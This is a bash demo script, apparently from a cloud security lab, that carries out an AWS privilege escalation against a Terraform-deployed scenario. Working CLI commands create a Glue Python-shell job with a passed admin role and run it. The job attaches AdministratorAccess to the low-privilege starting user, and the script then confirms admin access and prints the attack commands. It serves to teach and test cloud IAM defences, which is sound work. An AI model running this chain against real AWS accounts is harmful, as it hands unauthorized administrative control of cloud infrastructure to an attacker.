#!/bin/bash

# Demo script for iam:PassRole + glue:CreateJob + glue:StartJobRun privilege escalation
# This script demonstrates how a user with PassRole, CreateJob, and StartJobRun can escalate to admin


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    echo -e "${DIM}\$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    echo -e "\n${CYAN}\$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-glue-003-to-admin-starting-user"
TARGET_ROLE="pl-prod-glue-003-to-admin-target-role"

# Generate random suffix for job name
RANDOM_SUFFIX=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 6 | head -n 1)
GLUE_JOB_NAME="pl-glue-003-demo-job-${RANDOM_SUFFIX}"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + Glue CreateJob + StartJobRun Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_glue_003_iam_passrole_glue_createjob_glue_startjobrun.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
show_cmd "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify lack of admin permissions
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
show_cmd "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Retrieve pre-uploaded script location from Terraform
echo -e "${YELLOW}Step 5: Retrieving pre-uploaded Glue job script from Terraform${NC}"

SCRIPT_S3_PATH=$(echo "$MODULE_OUTPUT" | jq -r '.script_s3_path')
SCRIPT_BUCKET=$(echo "$MODULE_OUTPUT" | jq -r '.script_bucket_name')

if [ "$SCRIPT_S3_PATH" == "null" ] || [ -z "$SCRIPT_S3_PATH" ]; then
    echo -e "${RED}Error: Could not retrieve script S3 path from terraform output${NC}"
    exit 1
fi

echo "Script S3 path: $SCRIPT_S3_PATH"
echo "Script bucket: $SCRIPT_BUCKET"
echo ""
echo -e "${BLUE}ℹ Attack Simulation Note:${NC}"
echo -e "${BLUE}  The Python script was pre-uploaded by Terraform to a bucket in this account for demonstration.${NC}"
echo -e "${BLUE}  In a real attack, this would typically be an attacker-controlled S3 bucket in another${NC}"
echo -e "${BLUE}  account that grants public read access. The starting user can read from this bucket${NC}"
echo -e "${BLUE}  via a bucket policy (not IAM permissions), simulating access to a public attacker bucket.${NC}"
echo ""
echo -e "${GREEN}✓ Retrieved script location from Terraform${NC}\n"

# Step 6: Create Glue job with admin role
echo -e "${YELLOW}Step 6: Creating Glue job with admin role${NC}"
echo "This is the privilege escalation vector - passing the admin role to Glue..."
TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
echo "Target Role ARN: $TARGET_ROLE_ARN"
echo "Job Name: $GLUE_JOB_NAME"

show_attack_cmd "aws glue create-job --region $AWS_REGION --name \"$GLUE_JOB_NAME\" --role \"$TARGET_ROLE_ARN\" --command \"Name=pythonshell,ScriptLocation=${SCRIPT_S3_PATH},PythonVersion=3.9\" --default-arguments '{\"--job-language\":\"python\"}' --max-capacity 0.0625 --timeout 5 --output json"
aws glue create-job \
    --region $AWS_REGION \
    --name "$GLUE_JOB_NAME" \
    --role "$TARGET_ROLE_ARN" \
    --command "Name=pythonshell,ScriptLocation=${SCRIPT_S3_PATH},PythonVersion=3.9" \
    --default-arguments '{"--job-language":"python"}' \
    --max-capacity 0.0625 \
    --timeout 5 \
    --output json > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully created Glue job with admin role!${NC}"
else
    echo -e "${RED}Error: Failed to create Glue job${NC}"
    exit 1
fi
echo ""

# Step 7: Start the Glue job run
echo -e "${YELLOW}Step 7: Starting Glue job run${NC}"
echo "Starting job: $GLUE_JOB_NAME"

show_attack_cmd "aws glue start-job-run --region $AWS_REGION --job-name \"$GLUE_JOB_NAME\" --output json"
JOB_RUN_OUTPUT=$(aws glue start-job-run \
    --region $AWS_REGION \
    --job-name "$GLUE_JOB_NAME" \
    --output json)

JOB_RUN_ID=$(echo "$JOB_RUN_OUTPUT" | jq -r '.JobRunId')

if [ -z "$JOB_RUN_ID" ] || [ "$JOB_RUN_ID" = "null" ]; then
    echo -e "${RED}Error: Failed to start Glue job run${NC}"
    exit 1
fi

echo "Job Run ID: $JOB_RUN_ID"
echo -e "${GREEN}✓ Job run started successfully${NC}\n"

# Step 8: Wait for job completion
echo -e "${YELLOW}Step 8: Waiting for Glue job to complete${NC}"
echo "Monitoring job status (checking every 5 seconds)..."

MAX_WAIT=300  # 5 minutes
ELAPSED=0

while [ $ELAPSED -lt $MAX_WAIT ]; do
    show_cmd "aws glue get-job-run --region $AWS_REGION --job-name \"$GLUE_JOB_NAME\" --run-id \"$JOB_RUN_ID\" --query 'JobRun.JobRunState' --output text"
    JOB_STATUS=$(aws glue get-job-run \
        --region $AWS_REGION \
        --job-name "$GLUE_JOB_NAME" \
        --run-id "$JOB_RUN_ID" \
        --query 'JobRun.JobRunState' \
        --output text 2>/dev/null)

    echo "  [${ELAPSED}s] Job status: $JOB_STATUS"

    if [ "$JOB_STATUS" = "SUCCEEDED" ]; then
        echo -e "${GREEN}✓ Glue job completed successfully!${NC}\n"
        break
    elif [ "$JOB_STATUS" = "FAILED" ] || [ "$JOB_STATUS" = "STOPPED" ] || [ "$JOB_STATUS" = "ERROR" ]; then
        echo -e "${RED}✗ Glue job failed with status: $JOB_STATUS${NC}"
        echo "Fetching error details..."
        aws glue get-job-run \
            --region $AWS_REGION \
            --job-name "$GLUE_JOB_NAME" \
            --run-id "$JOB_RUN_ID" \
            --query 'JobRun.ErrorMessage' \
            --output text
        exit 1
    fi

    sleep 5
    ELAPSED=$((ELAPSED + 5))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "${RED}✗ Timeout: Job did not complete within expected time${NC}"
    exit 1
fi

# Step 9: Wait for IAM policy to propagate
echo -e "${YELLOW}Step 9: Waiting for IAM policy changes to propagate${NC}"
echo "IAM changes can take up to 15 seconds to be effective..."
sleep 15
echo -e "${GREEN}✓ Policy propagation complete${NC}\n"

# Step 10: Verify admin access
echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

show_cmd "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Retrieved pre-uploaded Python script from S3 (deployed by Terraform)"
echo "3. Created Glue job with admin role: $TARGET_ROLE"
echo "4. Started Glue job run which executed the Python script"
echo "5. Script attached AdministratorAccess to starting user"
echo "6. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (iam:PassRole + glue:CreateJob)"
echo -e "  → Glue Job with $TARGET_ROLE"
echo -e "  → (glue:StartJobRun) → Execute Python Script"
echo -e "  → (iam:AttachUserPolicy) → Admin Access"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Glue Job: $GLUE_JOB_NAME"
echo "- Policy Attachment: AdministratorAccess on $STARTING_USER"

echo -e "\n${RED}⚠ Warning: The following resources are still deployed:${NC}"
echo -e "${RED}  - Glue job: $GLUE_JOB_NAME${NC}"
echo -e "${RED}  - AdministratorAccess policy attached to starting user${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
